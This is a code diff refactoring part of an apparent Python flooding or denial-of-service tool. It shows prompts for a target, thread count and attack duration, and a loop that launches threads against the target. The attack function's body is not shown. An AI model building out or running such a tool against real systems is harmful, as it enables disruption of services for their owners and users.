@@ -28,13 +28,13 @@ def start():
      try:
           target = str(input("ENTER YOUR TARGET: "))
           threads = int(input("ENTER THREADS: "))
-          TIME = float(input("ENTER ATTACK DURATION: "))
-          timeout = time.time() + 1*TIME
+          _time = float(input("ENTER ATTACK DURATION: "))
+          timeout = time.time() + 1*_time
      except:
           print("Invalid Input")
           return 0
      finally:
-          return (target, threads, TIME, timeout)
+          return (target, threads, _time, timeout)
     
 def attack(timeout, target):
     try:
@@ -49,13 +49,13 @@ def attack(timeout, target):
     
 def main():
     while True:
-          gui()
-          target, threads, TIME, timeout = start()
-          for x in range(0, threads):
-               t1 = threading.Thread(target=attack, args=(timeout, target))
-               t1.start()
-          time.sleep(TIME)
-          system("cls")
+        gui()
+        target, threads, _time, timeout = start()
+        for _ in range(threads):
+            t1 = threading.Thread(target=attack, args=(timeout, target))
+            t1.start()
+        time.sleep(_time)
+        system("cls")
 
 if __name__ == '__main__':
     main()
